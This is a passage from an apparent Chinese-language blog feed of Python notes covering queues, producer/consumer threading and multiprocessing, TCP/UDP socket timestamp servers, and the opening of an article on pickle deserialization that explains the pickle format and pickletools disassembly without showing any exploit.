align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr></tbody></table><p><strong>异常</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">当对空队列调用get*()方法时抛出异常</td></tr><tr><td align="center">Full</td><td align="center">当对已满的队列调用put*()方法时抛出异常</td></tr></tbody></table><p><strong>方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td></tr><tr><td align="center">empty()</td><td align="center">如果队列为空，则返回True，否则返回False</td></tr><tr><td align="center">full()</td><td align="center">如果队列已满，则返回True，否则返回False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">和put(item,Flase)相同</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td></tr><tr><td align="center">get_nowait()</td><td align="center">和get(False)相同</td></tr><tr><td align="center">task_done()</td><td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td></tr><tr><td align="center">join()</td><td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> myThread <span class="keyword">import</span> MyThread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeQ</span><span class="params">(queue)</span>:</span></span><br><span class="line">    queue.put(<span class="string">"xxx"</span>,<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"producing object for Q... "</span>,end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"size now "</span>,queue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randQ</span><span class="params">(queue)</span>:</span></span><br><span class="line">    val = queue.get()</span><br><span class="line">    print(<span class="string">"consumed object from Q... size now "</span>, queue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writer</span><span class="params">(queue, loops)</span>:</span>   <span class="comment">#写数据入队列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(loops):</span><br><span class="line">        writeQ(queue)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reader</span><span class="params">(queue, loops)</span>:</span>   <span class="comment">#从队列中取出数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(loops):</span><br><span class="line">        randQ(queue)</span><br><span class="line">        sleep(<span class="number">2</span>)            <span class="comment">#添加延时便于观察</span></span><br><span class="line"></span><br><span class="line">funcs = [reader, writer]</span><br><span class="line">nfuncs = range(len(funcs))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    nloops = <span class="number">5</span></span><br><span class="line">    q = Queue(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        t = MyThread(funcs[i], (q, nloops), funcs[i].__name__)</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nfuncs:</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"all DONE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411121807570.png" alt=""></p><h3 id="生产者，消费者-多进程"><a href="#生产者，消费者-多进程" class="headerlink" title="生产者，消费者(多进程)"></a>生产者，消费者(多进程)</h3><p><code>multiprocessing</code>模块方法参考python官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/multiprocessing.html#module-multiprocessing" target="_blank" rel="noopener">multiprocessing</a> — 基于进程的并行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, JoinableQueue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consumer</span><span class="params">(q, name)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = q.get()  <span class="comment">#从对列中取出并返回对象</span></span><br><span class="line">        time.sleep(random.randint(<span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line">        print(<span class="string">'%s 吃掉了 %s'</span> % (name, res))</span><br><span class="line">        q.task_done()  <span class="comment">#发送信号给q.join(),说明已经从队列中取走一个数据并处理完毕</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">producer</span><span class="params">(q, name, food)</span>:</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line">    res = <span class="string">'%s'</span> % (food)</span><br><span class="line">    q.put(res)  <span class="comment">#将res放入队列</span></span><br><span class="line">    print(<span class="string">'%s 生产了 %s'</span> % (name, res))</span><br><span class="line">    q.join()    <span class="comment"># 等到消费者把自己放入队列中的所有的数据都取走之后，生产者才结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = JoinableQueue()     <span class="comment"># 使用JoinableQueue()</span></span><br><span class="line">    foods = [<span class="string">"包子"</span>,<span class="string">"豆浆"</span>,<span class="string">"油条"</span>,<span class="string">"稀饭"</span>]</span><br><span class="line">    producerthreads = []</span><br><span class="line">    consumerthreads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(foods)):</span><br><span class="line">        t = Process(target=producer, args=(q, <span class="string">'厨师'</span>, foods[i]))</span><br><span class="line">        producerthreads.append(t)</span><br><span class="line">        producerthreads[<span class="number">-1</span>].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(foods)):</span><br><span class="line">        t = Process(target=consumer, args=(q, <span class="string">'吃货'</span>))</span><br><span class="line">        consumerthreads.append(t)</span><br><span class="line">        consumerthreads[<span class="number">-1</span>].daemon = <span class="literal">True</span></span><br><span class="line">        consumerthreads[<span class="number">-1</span>].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(producerthreads)):</span><br><span class="line">        producerthreads[i].join()</span><br><span class="line">    <span class="comment"># 1、主进程等生产者p1,p2,p3结束</span></span><br><span class="line">    <span class="comment"># 2、而p1，p2，p3，是在消费者把所有数据都取干净之后才会结束</span></span><br><span class="line">    <span class="comment"># 3、所以一旦p1,p2,p3结束了，证明消费者也没必要存在了，应该随着主进程一块死掉，因而需要将生产者们设置成守护进程</span></span><br><span class="line">    print(<span class="string">"END"</span>)</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410113256008.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-网络编程</title>
      <link href="/2020/04/08/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/04/08/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="scoket模块"><a href="#scoket模块" class="headerlink" title="scoket模块"></a>scoket模块</h3><p>需要进行网络编程就要创建套接字，而在python中要创建套接字，就必须使用<code>socket.scoket()</code>函数，它的一般语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(scoket_family,scoket_type,protocol=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>scoket_family</code>可以是<code>AF_UNIX</code>或<code>AF_INET(6)</code></p><ul><li><strong>AF_UNIX</strong>：UNIX，用于单一的<code>UNIX</code>系统进程之间的通信</li><li><strong>AF_INET(6)</strong>：因特网，IPv4或IPv6</li></ul><p><code>scoket_type</code>可以是<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></p><ul><li><strong>SOCK_STREAM</strong>：TCP，面向连接的套接字(流套接字，虚拟电路)，主要协议是TCP(传输控制协议)</li><li><strong>SOCK_DGRAM</strong>：UDP，无连接的套接字(数据报)，主要协议为UDP(用户数据报协议)protocol</li></ul><p><code>protocol</code>参数为与特定的地址家族相关的协议，默认为0(根据地址格式和套接类别,自动选择一个合适的协议)，该参数通常省略</p><p>创建<code>TCP/IP</code>套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>创建<code>UPD/IP</code>套接字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udpSock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>服务器套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.bind()</td><td align="center">将地址(主机名字),绑定到套接字上，参数需要为元祖格式</td></tr><tr><td align="center">s.listen()</td><td align="center">设置并启动TCP监听器，参数为最大挂起连接数</td></tr><tr><td align="center">s.accept()</td><td align="center">被动接受TCP客户端连接，一直等待到连接到达(阻塞)</td></tr></tbody></table><p>客户端套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.connect()</td><td align="center">主动发起TCP服务器连接</td></tr><tr><td align="center">s.connect_ex()</td><td align="center">connect的扩展版本，会以错误码形式返回问题，而不是抛出一个异常</td></tr></tbody></table><p>普通套接字方法</p><table><thead><tr><th align="center">名称</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">s.recv()</td><td align="center">接受TCP消息</td></tr><tr><td align="center">s.send()</td><td align="center">发送TCP消息</td></tr><tr><td align="center">s.sendall</td><td align="center">完整的发送TCP消息</td></tr><tr><td align="center">s.recvfrom()</td><td align="center">接收UDP消息</td></tr><tr><td align="center">s.sendto()</td><td align="center">发送UDP消息</td></tr><tr><td align="center">s.shutdown()</td><td align="center">关闭连接</td></tr><tr><td align="center">s.close()</td><td align="center">关闭套接字</td></tr></tbody></table><h3 id="TCP时间戳服务器"><a href="#TCP时间戳服务器" class="headerlink" title="TCP时间戳服务器"></a>TCP时间戳服务器</h3><p>服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"0.0.0.0"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    print(<span class="string">"Waiting for connection..."</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    print(<span class="string">"...connected from:&#123;&#125;"</span>.format(addr))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tcpCliSock.send(<span class="string">"[&#123;&#125;] &#123;&#125;"</span>.format(ctime(),data.decode()).encode())</span><br><span class="line">    tcpCliSock.close()</span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"192.168.0.102"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">tcpCliSock = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    data = input(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tcpCliSock.send(data.encode())</span><br><span class="line">    data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    print(data.decode())</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408155313046.png" alt=""></p><h3 id="UDP时间戳服务器"><a href="#UDP时间戳服务器" class="headerlink" title="UDP时间戳服务器"></a>UDP时间戳服务器</h3><p>服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"0.0.0.0"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">udpSerSock = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">udpSerSock.bind(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    print(<span class="string">"Waiting for message..."</span>)</span><br><span class="line">    data, addr = udpSerSock.recvfrom(BUFSIZ)</span><br><span class="line">    udpSerSock.sendto(<span class="string">"[&#123;&#125;] &#123;&#125;"</span>.format(ctime(),data.decode()).encode(),addr)</span><br><span class="line">    print(<span class="string">"...received from and returned to :&#123;&#125;"</span>.format(addr))</span><br><span class="line">udpSerSock.close()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"192.168.0.102"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line">udpCliSock = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    data = input(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    udpCliSock.sendto(data.encode(),ADDR)</span><br><span class="line">    data, ADDR = udpCliSock.recvfrom(BUFSIZ)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    print(data.decode())</span><br><span class="line">udpCliSock.close()</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt=""></p><h3 id="scoketserver模块"><a href="#scoketserver模块" class="headerlink" title="scoketserver模块"></a>scoketserver模块</h3><p><code>socketserver</code>是标准库中的一个高级别的模块。用于简化实现网络客户端与服务器所需要的大量样板代码。模块中已经实现了一些可以使用的类</p><table><thead><tr><th align="center">类</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">BaseServer</td><td align="center">包含核心服务器功能和mix-in的钩子，仅用于推导，不创建类的实例</td></tr><tr><td align="center">TCPServer/UDPServer</td><td align="center">基础的网络同步TCP/UDP服务器</td></tr><tr><td align="center">UnixStreamServer/UnixDatagramServer</td><td align="center">基于文件的基础同步TCP/UDP服务器</td></tr><tr><td align="center">BaseRequestHandler</td><td align="center">包含处理服务器请求的核心功能，仅用于推导，不创建类的实例</td></tr><tr><td align="center">StreamRequestHandler/DatagramRequestHandler</td><td align="center">实现TCP/UDP服务器的服务处理器</td></tr></tbody></table><h3 id="scoketserver-TCP-服务器"><a href="#scoketserver-TCP-服务器" class="headerlink" title="scoketserver TCP 服务器"></a>scoketserver TCP 服务器</h3><p>服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> (TCPServer <span class="keyword">as</span> TCP, StreamRequestHandler <span class="keyword">as</span> SRH)</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"0.0.0.0"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRequestHandler</span><span class="params">(SRH)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"...conneceted from :&#123;&#125;"</span>.format(self.client_address))</span><br><span class="line">        self.wfile.write(<span class="string">"[&#123;&#125;] &#123;&#125;"</span>.format(ctime(),self.rfile.readline().decode()).encode())</span><br><span class="line"></span><br><span class="line">tcpServ = TCP(ADDR,MyRequestHandler)</span><br><span class="line">print(<span class="string">"waiting for connection..."</span>)</span><br><span class="line">tcpServ.serve_forever()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"192.168.0.102"</span></span><br><span class="line">PORT = <span class="number">22222</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST,PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">tcpCliSock = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line">data = input(<span class="string">'&gt; '</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">tcpCliSock.send(<span class="string">"&#123;&#125;\r\n"</span>.format(data).encode())</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(data.decode().strip())</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化漏洞浅析</title>
      <link href="/2020/04/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
      <url>/2020/04/05/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="pickle库"><a href="#pickle库" class="headerlink" title="pickle库"></a>pickle库</h3><p>说到python反序列化就当然离不开<code>pickle</code>库</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt=""></p><p>以上例子简单的示范了python进行序列化和反序列化的操作</p><h3 id="pickletools库"><a href="#pickletools库" class="headerlink" title="pickletools库"></a>pickletools库</h3><p>为了能够更深层的理解python反序列化的过程，这里需要用到一个python自带的pickle调试器<code>pickletools</code>库，这个库有三个功能：</p><ul><li>反汇编一个已经被打包的字符串   <code>pickletools.dis</code></li><li>优化一个已经被打包的字符串       <code>pickletools.optimize</code></li><li>返回一个迭代器来供程序使用       <code>pickletools.genops</code></li></ul><p>一般我们使用前两个功能，可以先看一下效果：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python反序列化漏洞浅析/image-20200405205451074.png" style="zoom:80%;" /><p>这就是反汇编的功能，解析那个字符串，然后告诉你这个字符串干了什么，每一行都是一条指令</p><p>序列化结构示意图（转）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt=""></p><p>栈是反序列化最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，前序栈保存了程序运行至今的（不在顶层的）完整的栈信息。</p><p>存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西。</p><p>下面我们试图来序列化一个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dairy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.date = <span class="number">20202020</span></span><br><span class="line">        self.text = <span class="string">'语言'</span></span><br><span class="line">        self.tode = [<span class="string">'计'</span>,<span class="string">'算'</span>,<span class="string">'机'</span>]</span><br><span class="line">        </span><br><span class="line">today = dairy()</span><br><span class="line">print(pickle.dumps(today))</span><br><span class="line">x = pickle.dumps(today)</span><br><span class="line">x = pickletools.optimize(x)   <span class="comment">#优化，消除未使用的PUT</span></span><br><span class="line">pickletools.dis(x)     <span class="comment">#反汇编一个已经打包的字符串，优化一个已经被打包的字符串</span></span><br></pre></td></tr></table></figure><p><code>pickle</code>构造出的字符串有很多个版本，在<code>pickle.loads</code>时可以用<code>protocol</code>参数指定协议的版本，目前这些协议有0,1,2,3,4号版本，默认使用的是3号版本，pickle协议版本向前兼容，所以不用担心0号版本的字符串交给<code>pickle.loads</code>后会发生什么意外</p><ul><li><strong>v0</strong> 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li><strong>v1</strong> 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li><strong>v2</strong> 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。</li><li><strong>v3</strong> 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 